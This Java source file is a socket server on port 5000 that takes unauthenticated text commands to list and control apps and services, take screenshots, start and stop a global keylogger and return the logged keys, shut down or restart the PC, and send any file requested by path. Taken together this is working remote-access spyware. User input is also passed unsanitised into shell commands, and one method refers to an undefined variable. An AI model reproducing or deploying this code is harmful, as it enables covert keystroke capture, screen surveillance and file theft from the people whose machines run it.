import java.io.*;
import java.net.ServerSocket;
import java.net.Socket;
import java.util.List;

import java.awt.*;
import java.awt.image.BufferedImage;
import java.io.ByteArrayOutputStream;
import java.io.IOException;
import java.util.ArrayList;
import javax.imageio.ImageIO;

import com.github.kwhat.jnativehook.GlobalScreen;
import com.github.kwhat.jnativehook.NativeHookException;
import com.github.kwhat.jnativehook.keyboard.NativeKeyEvent;
import com.github.kwhat.jnativehook.keyboard.NativeKeyListener;

public class Server implements NativeKeyListener {
    static private String keyLoggingResult = "";

    public void nativeKeyPressed(NativeKeyEvent e) {
        keyLoggingResult += (NativeKeyEvent.getKeyText(e.getKeyCode()) + " ");
    }

    public static void main(String[] args) {
        Server server = new Server();

        try {
            // Setting up the server
            ServerSocket serverSocket = new ServerSocket(5000);
            GlobalScreen.addNativeKeyListener(new Server());
            while (true) {
                Socket socket = serverSocket.accept();
                System.out.println("Client connected: " + socket.getInetAddress().getHostAddress());

                Thread thread = new Thread(
                        () -> handleClientRequest(socket, server)
                );
                thread.start();
            }
        } catch (Exception e) {
            e.printStackTrace();
        }
    }

    public static void handleClientRequest(Socket socket, Server server) {
        try {
            BufferedReader reader = new BufferedReader(new InputStreamReader(socket.getInputStream()));
            PrintWriter writer = new PrintWriter(socket.getOutputStream());

            while (true) {
                String request = reader.readLine();

                if (request.equals("get-apps")) {
                    String appsList = getAppsList().toString();
                    writer.println(appsList);
                    writer.flush();

                } else if (request.equals("get-services")) {
                    String servicesList = getServicesList().toString();
                    writer.println(servicesList);
                    writer.flush();

                } else if (request.startsWith("start-app-")) {
                    String appName = request.substring(10);
                    boolean success = startApp(appName);
                    writer.println(success);
                    writer.flush();

                } else if (request.startsWith("start-service-")) {
                    String serviceName = request.substring(14);
                    boolean success = startService(serviceName);
                    writer.println(success);
                    writer.flush();

                } else if (request.startsWith("stop-app-")) {
                    String appName = request.substring(9);
                    boolean success = stopApp(appName);
                    writer.println(success);
                    writer.flush();

                } else if (request.startsWith("stop-service-")) {
                    String serviceName = request.substring(13);
                    boolean success = stopService(serviceName);
                    writer.println(success);
                    writer.flush();

                } else if (request.equals("screenshot")) {
                    try {
                        Robot robot = new Robot();
                        Rectangle screenRect = new Rectangle(Toolkit.getDefaultToolkit().getScreenSize());
                        BufferedImage screenshot = robot.createScreenCapture(screenRect);

                        File bufferOutput = new File("buffer.png");
                        ImageIO.write(screenshot, "png", bufferOutput);

                        String fileAddress = "buffer.png";
                        File file = new File(fileAddress);

                        writer.println(file.length());
                        writer.flush();

                        ByteArrayOutputStream baos = new ByteArrayOutputStream();
                        byte[] buffer = new byte[8192];
                        InputStream in = new FileInputStream(file);
                        int count;

                        while ((count = in.read(buffer)) > 0) {
                            baos.write(buffer, 0, count);
                        }
                        in.close();
                        socket.getOutputStream().write(baos.toByteArray());
                        baos.close();
                    } catch (Exception e) {
                        e.printStackTrace();
                    }

                } else if (request.equals("start-keylogger")) {
                    try {
                        GlobalScreen.registerNativeHook();
                        writer.println("A keylogger has been started.");
                        writer.flush();
                    }
                    catch (NativeHookException ex) {
                        System.err.println("There was a problem registering the native hook.");
                        System.err.println(ex.getMessage());
                        System.exit(1);
                    }

                } else if (request.equals("stop-keylogger")) {
                    try {
                        GlobalScreen.unregisterNativeHook();
                        writer.println(keyLoggingResult);
                        writer.flush();
                    } catch (NativeHookException nativeHookException) {
                        nativeHookException.printStackTrace();
                    }

                } else if (request.equals("shutdown")) {
                    Runtime.getRuntime().exec("shutdown -s -t 900");
                    writer.println("The computer is shutting down.");
                    writer.flush();

                } else if (request.equals("restart")) {
                    Runtime.getRuntime().exec("shutdown -r -t 900");
                    writer.println("The computer is restarting.");
                    writer.flush();

                } else if (request.equals("cancel-shutdown")) {
                    Runtime.getRuntime().exec("shutdown -a");
                    writer.println("All shutdown commands have been cancelled.");
                    writer.flush();

                } else if (request.startsWith("collect-")) {
                    String filePath = request.substring(8);
                    File file = new File(filePath);

                    if (file.exists()) {
                        writer.println(file.length());
                        writer.flush();

                        ByteArrayOutputStream baos = new ByteArrayOutputStream();
                        byte[] buffer = new byte[8192];
                        InputStream in = new FileInputStream(file);
                        int count;

                        while ((count = in.read(buffer)) > 0) {
                            baos.write(buffer, 0, count);
                        }
                        in.close();
                        socket.getOutputStream().write(baos.toByteArray());
                        baos.close();
                    } else {
                        writer.println("The file doesn't exist.");
                        writer.flush();
                    }
                }
            }
        } catch (Exception e) {
            e.printStackTrace();
        }
    }

    private static List<String> getAppsList() {
        List<String> appsList = new ArrayList<>();
        try {
            Process process = Runtime.getRuntime().exec("wmic product list");
            BufferedReader reader = new BufferedReader(new InputStreamReader(process.getInputStream()));

            String line;
            while ((line = reader.readLine()) != null) {
                if (line.startsWith("Name:")) {
                    String appName = line.substring(6).trim();
                    appsList.add(appName);
                }
            }
            reader.close();
        } catch (IOException e) {
            e.printStackTrace();
        }
        return appsList;
    }

    private static List<String> getServicesList() {
        List<String> servicesList = new ArrayList<>();
        try {
            Process process = Runtime.getRuntime().exec("sc query type= service state= all");
            BufferedReader reader = new BufferedReader(new InputStreamReader(process.getInputStream()));

            String line;
            while ((line = reader.readLine()) != null) {
                if (line.startsWith("Name:")) {
                    String serviceName = line.substring(6).trim();
                    servicesList.add(Name);
                }
            }
            reader.close();
        } catch (IOException e) {
            e.printStackTrace();
        }
        return servicesList;
    }

    private static boolean startApp(String appName) {
        try {
            Runtime.getRuntime().exec("start " + appName);
            return true;
        } catch (IOException e) {
            e.printStackTrace();
            return false;
        }
    }

    private static boolean startService(String serviceName) {
        try {
            Process process = Runtime.getRuntime().exec("net start " + serviceName);
            int exitCode = process.waitFor();
            return exitCode == 0;
        } catch (IOException | InterruptedException e) {
            e.printStackTrace();
            return false;
        }
    }

    private static boolean stopApp(String appName) {
        try {
            Runtime.getRuntime().exec("taskkill /F /IM " + appName + ".exe");
            return true;
        } catch (IOException e) {
            e.printStackTrace();
            return false;
        }
    }

    private  static boolean stopService(String serviceName) {
        try {
            Process process = Runtime.getRuntime().exec("net stop " + serviceName);
            int exitCode = process.waitFor();
            return exitCode == 0;
        } catch (IOException | InterruptedException e) {
            e.printStackTrace();
            return false;
        }
    }
}

